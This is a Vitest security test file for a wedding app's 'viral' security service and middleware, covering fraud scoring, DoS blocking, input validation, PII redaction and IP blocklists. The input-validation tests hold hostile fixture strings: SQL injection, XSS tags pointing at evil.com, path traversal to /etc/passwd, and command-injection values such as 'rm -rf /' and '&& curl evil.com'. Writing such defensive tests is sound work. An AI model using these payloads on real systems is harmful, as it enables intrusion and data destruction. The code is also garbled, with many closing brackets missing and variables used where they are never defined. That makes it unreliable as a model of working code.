/**
 * Security Tests - Viral Optimization Security Enhancements
 * WS-141 Round 2: Comprehensive security validation
 * FOCUS: Fraud detection, DoS protection, input validation, privacy protection
 */

import { describe, it, expect, vi, beforeEach, afterEach, beforeAll, afterAll, Mock } from 'vitest';
import { ViralSecurityService } from '@/lib/services/viral-security-service'
import { viralSecurityMiddleware } from '@/middleware/viral-security'
import { NextRequest } from 'next/server'
// Mock dependencies
vi.mock('@/lib/supabase/client', () => ({
  supabase: {
    rpc: vi.fn(),
    from: vi.fn().mockReturnThis(),
    select: vi.fn().mockReturnThis(),
    insert: vi.fn().mockReturnThis(),
    eq: vi.fn().mockReturnThis(),
    gt: vi.fn().mockReturnThis(),
    limit: vi.fn().mockReturnThis()
  }
}))
vi.mock('@/lib/ratelimit', () => ({
  rateLimit: {
    check: vi.fn()
describe('Viral Security Service Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks()
  })
  afterEach(() => {
    vi.restoreAllMocks()
  describe('Fraud Detection', () => {
    it('should detect high-velocity fraud patterns', async () => {
      // Mock high-velocity pattern
      const mockSupabase = require('@/lib/supabase/client').supabase
      mockSupabase.rpc.mockResolvedValue({
        data: [{ count: 25, time_window: '1 hour' }],
        error: null
      })
      const result = await ViralSecurityService.detectFraud(
        'user-123',
        'create_referral',
        { amount: 100 },
        '192.168.1.1',
        'Mozilla/5.0 (compatible; bot)'
      )
      expect(result.is_fraudulent).toBe(true)
      expect(result.confidence_score).toBeGreaterThan(0.7)
      expect(result.risk_factors).toContain(expect.stringMatching(/velocity|rate/i))
      expect(result.blocked_automatically).toBe(true)
    })
    it('should detect suspicious network patterns', async () => {
        'user-456',
        'send_invitation',
        {},
        '10.0.0.1', // Private IP attempting external action
        undefined // No user agent
      expect(result.requires_manual_review).toBe(true)
      expect(result.risk_factors.length).toBeGreaterThan(0)
    it('should handle legitimate user activity correctly', async () => {
        data: [{ count: 3, time_window: '1 hour' }],
        'user-789',
        { recipient: 'friend@example.com' },
        '203.0.113.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      expect(result.is_fraudulent).toBe(false)
      expect(result.confidence_score).toBeLessThan(0.5)
      expect(result.blocked_automatically).toBe(false)
    it('should fail securely on detection errors', async () => {
      mockSupabase.rpc.mockRejectedValue(new Error('Database connection failed'))
        'user-999',
        'test_action',
        '192.168.1.1'
      // Should fail securely - assume fraud on error
      expect(result.risk_factors).toContain('System error during fraud detection')
    it('should track fraud confidence scores accurately', async () => {
      const testCases = [
        { velocity: 5, expected: 'low' },
        { velocity: 15, expected: 'medium' },
        { velocity: 50, expected: 'high' }
      ]
      for (const testCase of testCases) {
        const mockSupabase = require('@/lib/supabase/client').supabase
        mockSupabase.rpc.mockResolvedValue({
          data: [{ count: testCase.velocity, time_window: '1 hour' }],
          error: null
        })
        const result = await ViralSecurityService.detectFraud(
          `user-${testCase.velocity}`,
          'test_action',
          {},
          '192.168.1.1'
        )
        if (testCase.expected === 'high') {
          expect(result.confidence_score).toBeGreaterThan(0.8)
        } else if (testCase.expected === 'medium') {
          expect(result.confidence_score).toBeGreaterThanOrEqual(0.5)
          expect(result.confidence_score).toBeLessThanOrEqual(0.8)
        } else {
          expect(result.confidence_score).toBeLessThan(0.5)
        }
      }
  describe('DoS Protection', () => {
    beforeEach(() => {
      const { rateLimit } = require('@/lib/ratelimit')
      rateLimit.check.mockResolvedValue({ allowed: true, remaining: 50, count: 10 })
    it('should detect rate-based DoS attacks', async () => {
      rateLimit.check.mockResolvedValue({ 
        allowed: false, 
        remaining: 0, 
        count: 150 
      const result = await ViralSecurityService.detectDoS(
        '192.168.1.100',
        '/api/viral/rewards',
        'AttackBot/1.0'
      expect(result.is_dos_attack).toBe(true)
      expect(result.attack_vector).toContain(expect.stringMatching(/rate limit/i))
      expect(result.mitigation_applied).toContain(expect.stringMatching(/blocked/i))
      expect(result.block_duration_minutes).toBeGreaterThan(0)
    it('should analyze source reputation correctly', async () => {
      const suspiciousResult = await ViralSecurityService.detectDoS(
        '/api/viral/ab-testing',
        '' // Empty user agent is suspicious
      expect(suspiciousResult.source_analysis.user_agent_anomaly).toBe(true)
      const normalResult = await ViralSecurityService.detectDoS(
        '/api/viral/analytics',
      expect(normalResult.is_dos_attack).toBe(false)
    it('should implement escalating block durations', async () => {
      
      // Simulate multiple attack vectors detected
      rateLimit.check.mockResolvedValue({ allowed: false, remaining: 0, count: 200 })
        '192.168.1.200',
        '/api/viral/super-connectors'
      expect(result.block_duration_minutes).toBeDefined()
      expect(result.block_duration_minutes).toBeGreaterThan(15)
      expect(result.block_duration_minutes).toBeLessThanOrEqual(240)
      rateLimit.check.mockRejectedValue(new Error('Rate limiter unavailable'))
        '/api/viral/test'
      // Should fail securely - assume attack
      expect(result.attack_vector).toContain('System error during DoS detection')
      expect(result.block_duration_minutes).toBe(60)
  describe('Input Validation', () => {
    it('should detect SQL injection patterns', () => {
      const maliciousInput = {
        name: 'John\'); DROP TABLE users; --',
        email: 'test@example.com',
        message: 'Hello OR 1=1'
      const result = ViralSecurityService.validateSecureInput(maliciousInput, {})
      expect(result.is_valid).toBe(false)
      expect(result.security_issues).toHaveLength(2)
      expect(result.security_issues[0].type).toBe('injection')
      expect(result.security_issues[0].severity).toBe('high')
    it('should detect XSS attack patterns', () => {
      const xssInput = {
        name: '<script>alert("xss")</script>',
        message: 'Hello <iframe src="evil.com"></iframe>',
        comment: 'Click <a href="javascript:alert()">here</a>'
      const result = ViralSecurityService.validateSecureInput(xssInput, {})
      expect(result.security_issues.some(issue => issue.type === 'xss')).toBe(true)
      expect(result.requires_encoding).toContain('name')
      expect(result.requires_encoding).toContain('message')
    it('should detect path traversal attempts', () => {
      const traversalInput = {
        file: '../../../etc/passwd',
        path: '..\\..\\windows\\system32',
        upload: '%2e%2e%2f%2e%2e%2fconfig'
      const result = ViralSecurityService.validateSecureInput(traversalInput, {})
      expect(result.security_issues.some(issue => issue.type === 'path_traversal')).toBe(true)
    it('should detect command injection patterns', () => {
      const commandInput = {
        filename: 'test.txt; rm -rf /',
        command: 'list | grep secret',
        data: 'normal && curl evil.com'
      const result = ViralSecurityService.validateSecureInput(commandInput, {})
      expect(result.security_issues.some(issue => issue.type === 'command_injection')).toBe(true)
      expect(result.security_issues.some(issue => issue.severity === 'high')).toBe(true)
    it('should sanitize input correctly', () => {
      const input = {
        name: '<script>alert("test")</script>John Doe',
        email: 'user@example.com',
        message: 'Hello javascript: there!'
      const result = ViralSecurityService.validateSecureInput(input, {})
      expect(result.sanitized_data.name).not.toContain('<script>')
      expect(result.sanitized_data.name).not.toContain('javascript:')
      expect(result.sanitized_data.email).toBe('user@example.com') // Should remain unchanged
    it('should handle valid input correctly', () => {
      const validInput = {
        name: 'John Doe',
        email: 'john@example.com',
        age: 30,
        message: 'Looking forward to using WedSync!'
      const result = ViralSecurityService.validateSecureInput(validInput, {})
      expect(result.is_valid).toBe(true)
      expect(result.security_issues).toHaveLength(0)
      expect(result.sanitized_data).toEqual(validInput)
    it('should fail securely on validation errors', () => {
      // Simulate validation system error
      vi.spyOn(console, 'error').mockImplementation(() => {})
      const result = ViralSecurityService.validateSecureInput(null as any, {})
      expect(result.requires_encoding.length).toBeGreaterThan(0)
  describe('Privacy Protection', () => {
    it('should detect and redact email addresses', () => {
      const data = {
        message: 'Contact me at john.doe@example.com for more info',
        backup_email: 'backup@company.org'
      const result = ViralSecurityService.protectPrivacy(data, 'logging')
      expect(result.contains_pii).toBe(true)
      expect(result.pii_types).toContain('email')
      expect(result.redacted_data.message).toContain('jo***@example.com')
      expect(result.encryption_required).toContain('message')
    it('should detect and redact phone numbers', () => {
        contact: 'Call me at +1 (555) 123-4567',
        phone: '555.987.6543'
      expect(result.pii_types).toContain('phone')
      expect(result.redacted_data.contact).toContain('***-***-4567')
      expect(result.redacted_data.phone).toContain('***-***-6543')
    it('should detect and redact SSN patterns', () => {
        ssn: '123-45-6789',
        tax_id: '987654321'
      expect(result.pii_types).toContain('ssn')
      expect(result.redacted_data.ssn).toBe('***-**-****')
      expect(result.encryption_required).toContain('ssn')
    it('should detect and redact credit card numbers', () => {
        payment: 'Card: 4532-1234-5678-9012',
        backup_card: '4111 1111 1111 1111'
      expect(result.pii_types).toContain('credit_card')
      expect(result.redacted_data.payment).toContain('****-****-****-9012')
      expect(result.redacted_data.backup_card).toContain('****-****-****-1111')
    it('should detect and redact names', () => {
        first_name: 'John',
        last_name: 'Doe',
        full_name: 'Jane Smith',
        message: 'Hello from Michael Johnson'
      expect(result.pii_types).toContain('name')
      expect(result.redacted_data.first_name).toBe('J***')
      expect(result.redacted_data.last_name).toBe('D***')
    it('should detect and redact addresses', () => {
        address: '123 Main Street, Anytown',
        location: '456 Oak Avenue, Suite 100'
      expect(result.pii_types).toContain('address')
      expect(result.redacted_data.address).toBe('[ADDRESS REDACTED]')
      expect(result.encryption_required).toContain('address')
    it('should set appropriate retention policies', () => {
      const highSensitiveData = { ssn: '123-45-6789' }
      const normalData = { name: 'John Doe', email: 'john@example.com' }
      const nonPiiData = { message: 'Hello world!' }
      const highSensitive = ViralSecurityService.protectPrivacy(highSensitiveData, 'storage')
      const normal = ViralSecurityService.protectPrivacy(normalData, 'storage')
      const nonPii = ViralSecurityService.protectPrivacy(nonPiiData, 'storage')
      expect(highSensitive.retention_policy.retention_days).toBe(30)
      expect(normal.retention_policy.retention_days).toBe(90)
      expect(nonPii.retention_policy.retention_days).toBe(365)
    it('should handle different contexts appropriately', () => {
      const data = { email: 'test@example.com' }
      const loggingResult = ViralSecurityService.protectPrivacy(data, 'logging')
      const storageResult = ViralSecurityService.protectPrivacy(data, 'storage')
      expect(loggingResult.redacted_data.email).toContain('***')
      expect(storageResult.redacted_data.email).toBe('test@example.com') // Less aggressive for storage
    it('should fail securely on privacy protection errors', () => {
      const result = ViralSecurityService.protectPrivacy(null as any, 'logging')
      expect(result.pii_types).toContain('unknown')
      expect(result.retention_policy.retention_days).toBe(30) // Most restrictive
  describe('IP Blocking', () => {
      mockSupabase.from.mockImplementation(() => ({
        select: () => ({
          eq: () => ({
            gt: () => ({
              limit: () => Promise.resolve({
                data: [],
                error: null
              })
            })
          })
      }))
    it('should check IP blocklist correctly', async () => {
                data: [{ ip_address: '192.168.1.100', expires_at: new Date(Date.now() + 60000).toISOString() }],
      const isBlocked = await ViralSecurityService.isBlocked('192.168.1.100')
      expect(isBlocked).toBe(true)
      const isNotBlocked = await ViralSecurityService.isBlocked('203.0.113.1')
      expect(isNotBlocked).toBe(false)
    it('should handle blocklist check errors gracefully', async () => {
              limit: () => Promise.reject(new Error('Database error'))
      const isBlocked = await ViralSecurityService.isBlocked('192.168.1.1')
      // Should fail open for availability
      expect(isBlocked).toBe(false)
})
describe('Viral Security Middleware Tests', () => {
    
    // Mock session for middleware tests
    jest.doMock('next-auth', () => ({
      getServerSession: vi.fn().mockResolvedValue({
        user: { id: 'user-123', email: 'test@example.com' }
    }))
  it('should allow clean requests through', async () => {
    const request = new NextRequest('https://example.com/api/viral/analytics', {
      method: 'GET',
      headers: {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-forwarded-for': '203.0.113.1'
    const result = await viralSecurityMiddleware(request, '/api/viral/analytics')
    expect(result.allowed).toBe(true)
    expect(result.warnings).toHaveLength(0)
    expect(result.securityHeaders['X-Security-Status']).toBe('passed')
  it('should block requests from blocked IPs', async () => {
    // Mock blocked IP
    const mockSupabase = require('@/lib/supabase/client').supabase
    mockSupabase.from.mockImplementation(() => ({
      select: () => ({
        eq: () => ({
          gt: () => ({
            limit: () => Promise.resolve({
              data: [{ ip_address: '192.168.1.100' }],
              error: null
    const request = new NextRequest('https://example.com/api/viral/rewards', {
      method: 'POST',
      headers: { 'x-forwarded-for': '192.168.1.100' }
    const result = await viralSecurityMiddleware(request, '/api/viral/rewards')
    expect(result.allowed).toBe(false)
    expect(result.blocked_reason).toContain('blocked')
  it('should detect and block DoS attacks', async () => {
    const { rateLimit } = require('@/lib/ratelimit')
    rateLimit.check.mockResolvedValue({ allowed: false, remaining: 0 })
    const request = new NextRequest('https://example.com/api/viral/super-connectors', {
      headers: { 'x-forwarded-for': '192.168.1.200' }
    const result = await viralSecurityMiddleware(request, '/api/viral/super-connectors')
    expect(result.blocked_reason).toBe('DoS attack detected')
    expect(result.response?.status).toBe(429)
  it('should validate malicious input in POST requests', async () => {
      body: JSON.stringify({
        email: 'test@example.com OR 1=1'
      }),
        'content-type': 'application/json',
    expect(result.blocked_reason).toContain('Input validation failed')
    expect(result.response?.status).toBe(400)
  it('should add appropriate security headers', async () => {
      headers: { 'x-forwarded-for': '203.0.113.1' }
    expect(result.securityHeaders).toHaveProperty('X-Content-Type-Options', 'nosniff')
    expect(result.securityHeaders).toHaveProperty('X-Frame-Options', 'DENY')
    expect(result.securityHeaders).toHaveProperty('X-XSS-Protection', '1; mode=block')
    expect(result.securityHeaders).toHaveProperty('Strict-Transport-Security')
    expect(result.securityHeaders).toHaveProperty('X-Security-Version', '2.0')
  it('should handle middleware errors gracefully', async () => {
    // Force an error in the middleware
      getServerSession: vi.fn().mockRejectedValue(new Error('Auth error'))
    const request = new NextRequest('https://example.com/api/viral/test', {
      method: 'GET'
    const result = await viralSecurityMiddleware(request)
    // Should fail open but log warnings
    expect(result.warnings).toContain('Security middleware encountered an error')
    expect(result.securityHeaders['X-Security-Status']).toBe('error')
  it('should provide security-adjusted rate limits', async () => {
    const { getSecurityAdjustedRateLimit } = require('@/middleware/viral-security')
    const highFraudResult = {
      allowed: true,
      securityHeaders: {},
      warnings: [],
      fraud_detection: { confidence_score: 0.8 },
      dos_protection: { source_analysis: { ip_reputation: 'suspicious' } }
    }
    const adjustedLimits = getSecurityAdjustedRateLimit(100, highFraudResult)
    expect(adjustedLimits.limit).toBeLessThan(100)
    expect(adjustedLimits.window).toBeGreaterThan(300)
